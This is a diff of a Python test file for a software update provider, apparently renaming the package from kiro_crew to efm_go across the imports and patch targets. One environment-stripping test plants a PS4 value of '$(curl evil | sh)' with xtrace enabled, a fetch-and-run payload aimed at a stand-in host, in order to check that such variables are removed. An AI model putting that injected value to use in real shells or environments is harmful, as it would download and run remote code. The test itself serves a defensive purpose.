             _MAX_CAPTURED_OUTPUT,
             _read_bounded_output,
         )
@@ -1552,7 +1552,7 @@ class TestOutputIsBounded:
     async def test_a_real_flood_does_not_deadlock_or_grow(self) -> None:
         """Executed for real: draining both pipes concurrently is what stops a
         full pipe buffer from wedging the child."""
-        from kiro_crew.platform.update_provider import (
+        from efm_go.platform.update_provider import (
             _MAX_CAPTURED_OUTPUT,
             _read_bounded_output,
             _shell_exec_args,
@@ -1576,7 +1576,7 @@ class TestOutputIsBounded:
         Driven through a task the test bounds itself, so a regression fails by
         name instead of hanging.
         """
-        from kiro_crew.platform.update_provider import _read_bounded_output
+        from efm_go.platform.update_provider import _read_bounded_output
 
         proc = _fake_proc()  # EOF on both streams at once
 
@@ -1601,7 +1601,7 @@ class TestOneApplyRunIsBounded:
 
     @pytest.mark.asyncio
     async def test_the_apply_waits_at_most_600_seconds(self) -> None:
-        from kiro_crew.platform import update_provider
+        from efm_go.platform import update_provider
 
         bounds = []
 
@@ -1611,11 +1611,11 @@ class TestOneApplyRunIsBounded:
 
         with (
             patch(
-                "kiro_crew.platform.update_provider._shell_exec_args",
+                "efm_go.platform.update_provider._shell_exec_args",
                 return_value=["/bin/sh", "-c", "true"],
             ),
             patch(
-                "kiro_crew.platform.update_provider.trusted_system_path",
+                "efm_go.platform.update_provider.trusted_system_path",
                 return_value="/usr/bin:/bin",
             ),
             patch("asyncio.create_subprocess_exec", AsyncMock(return_value=_fake_proc())),
@@ -1631,7 +1631,7 @@ class TestApplyOwnsTheBundleGap:
 
     @pytest.mark.asyncio
     async def test_the_command_runs_as_an_owning_update_step(self) -> None:
-        from kiro_crew import update_ownership
+        from efm_go import update_ownership
 
         seen = []
 
@@ -1641,11 +1641,11 @@ class TestApplyOwnsTheBundleGap:
 
         with (
             patch(
-                "kiro_crew.platform.update_provider._shell_exec_args",
+                "efm_go.platform.update_provider._shell_exec_args",
                 return_value=["/bin/sh", "-c", "true"],
             ),
             patch(
-                "kiro_crew.platform.update_provider.trusted_system_path",
+                "efm_go.platform.update_provider.trusted_system_path",
                 return_value="/usr/bin:/bin",
             ),
             patch("asyncio.create_subprocess_exec", _spawn),
@@ -1663,10 +1663,10 @@ class TestInstallerNeverLandsOnDisk:
     instead, which removes the window rather than policing it."""
 
     def test_command_stages_no_file(self) -> None:
-        from kiro_crew.platform.update_layout import wheel_update_command
+        from efm_go.platform.update_layout import wheel_update_command
 
         with patch(
-            "kiro_crew.platform.update_layout.cdn_bases",
+            "efm_go.platform.update_layout.cdn_bases",
             return_value=("https://f", "https://cdn.invalid"),
         ):
             cmd = wheel_update_command("stable")
@@ -1679,10 +1679,10 @@ class TestInstallerNeverLandsOnDisk:
     def test_empty_body_is_rejected(self) -> None:
         """A shell handed empty input exits 0, which is the false success the
         piped form had; the command must test the body before running it."""
-        from kiro_crew.platform.update_layout import wheel_update_command
+        from efm_go.platform.update_layout import wheel_update_command
 
         with patch(
-            "kiro_crew.platform.update_layout.cdn_bases",
+            "efm_go.platform.update_layout.cdn_bases",
             return_value=("https://f", "https://cdn.invalid"),
         ):
             cmd = wheel_update_command("stable")
@@ -1694,8 +1694,8 @@ class TestInstallerNeverLandsOnDisk:
         file must not re-introduce the exit-status swallowing it was added for."""
         import subprocess
 
-        from kiro_crew.platform.update_layout import wheel_update_command
-        from kiro_crew.platform.update_provider import _shell_exec_args
+        from efm_go.platform.update_layout import wheel_update_command
+        from efm_go.platform.update_provider import _shell_exec_args
 
         bin_dir = tmp_path / "bin"
         bin_dir.mkdir()
@@ -1704,7 +1704,7 @@ class TestInstallerNeverLandsOnDisk:
         fake_curl.chmod(0o755)
 
         with patch(
-            "kiro_crew.platform.update_layout.cdn_bases",
+            "efm_go.platform.update_layout.cdn_bases",
             return_value=("https://f", "https://cdn.invalid"),
         ):
             cmd = wheel_update_command("stable")
@@ -1812,14 +1812,14 @@ class TestWhitespaceCommandsAreNotPresence:
     matching how `source` and `min_version` were already handled."""
 
     def test_parse_strips_top_level_commands(self) -> None:
-        from kiro_crew.platform.governance import UpdatePins
+        from efm_go.platform.governance import UpdatePins
 
         pins = UpdatePins.from_dict({"apply_command": "   ", "check_command": "\t\n"})
         assert pins.apply_command == ""
         assert pins.check_command == ""
 
     def test_parse_strips_platform_commands(self) -> None:
-        from kiro_crew.platform.governance import UpdatePins
+        from efm_go.platform.governance import UpdatePins
 
         pins = UpdatePins.from_dict(
             {"platform_commands": {"linux-x86_64": {"apply_command": "  ", "check_command": " \t"}}}
@@ -1831,7 +1831,7 @@ class TestWhitespaceCommandsAreNotPresence:
 
     def test_a_real_command_keeps_its_text(self) -> None:
         """Stripping must not corrupt a legitimate command."""
-        from kiro_crew.platform.governance import UpdatePins
+        from efm_go.platform.governance import UpdatePins
 
         pins = UpdatePins.from_dict({"apply_command": "  /usr/bin/pkg update  "})
         assert pins.apply_command == "/usr/bin/pkg update"
@@ -1839,7 +1839,7 @@ class TestWhitespaceCommandsAreNotPresence:
     def test_whitespace_policy_falls_through_to_legacy(self) -> None:
         """The end-to-end invariant: a blank policy must NOT select a provider,
         because a selected provider owns the update and never falls back."""
-        from kiro_crew.platform.governance import UpdatePins
+        from efm_go.platform.governance import UpdatePins
 
         pins = UpdatePins.from_dict(
             {
@@ -1848,7 +1848,7 @@ class TestWhitespaceCommandsAreNotPresence:
                 "platform_commands": {_current_platform_key(): {"apply_command": "  "}},
             }
         )
-        with patch("kiro_crew.platform.governance.active_update_pins", return_value=pins):
+        with patch("efm_go.platform.governance.active_update_pins", return_value=pins):
             assert resolve_provider() is None
 
 
@@ -1869,11 +1869,11 @@ class TestRedactionHappensBeforeTruncation:
         proc = _fake_proc(returncode=1, stderr=stderr)
         with (
             patch(
-                "kiro_crew.platform.update_provider._shell_exec_args",
+                "efm_go.platform.update_provider._shell_exec_args",
                 return_value=["/bin/sh", "-c", "a"],
             ),
             patch(
-                "kiro_crew.platform.update_provider.trusted_system_path",
+                "efm_go.platform.update_provider.trusted_system_path",
                 return_value="/usr/bin:/bin",
             ),
             patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)),
@@ -1894,8 +1894,8 @@ class TestRedactionHappensBeforeTruncation:
         reintroduces `decode(...)[:500]` is caught even without a stderr fixture."""
         import inspect
 
-        from kiro_crew.platform import update_provider as provider_mod
-        from kiro_crew.slack import gateway as gateway_mod
+        from efm_go.platform import update_provider as provider_mod
+        from efm_go.slack import gateway as gateway_mod
 
         for module in (provider_mod, gateway_mod):
             src = inspect.getsource(module)
@@ -1963,7 +1963,7 @@ class TestShellCodeEnvStripping:
         with (
             patch.dict(os.environ, {"PATH": "/usr/bin", "LANG": "C", **planted}),
             patch(
-                "kiro_crew.platform.update_provider.trusted_system_path",
+                "efm_go.platform.update_provider.trusted_system_path",
                 return_value="/usr/bin:/bin",
             ),
         ):
@@ -1983,7 +1983,7 @@ class TestShellCodeEnvStripping:
                 {"PATH": "/usr/bin", "SHELLOPTS": "xtrace", "PS4": "$(curl evil | sh)"},
             ),
             patch(
-                "kiro_crew.platform.update_provider.trusted_system_path",
+                "efm_go.platform.update_provider.trusted_system_path",
                 return_value="/usr/bin:/bin",
             ),
         ):
